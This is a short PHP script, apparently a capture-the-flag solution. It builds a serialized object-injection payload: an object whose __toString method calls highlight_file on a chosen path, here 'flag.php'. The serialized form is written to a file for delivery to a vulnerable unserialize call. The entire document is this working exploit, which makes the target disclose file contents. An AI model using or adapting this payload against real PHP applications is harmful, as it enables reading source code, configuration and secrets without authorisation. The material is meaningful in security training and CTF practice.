<?php

Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}

$stuff = array(new GPLSourceBloater());
$stuff[0]->source = "flag.php";

file_put_contents('serialization', serialize($stuff));
?>
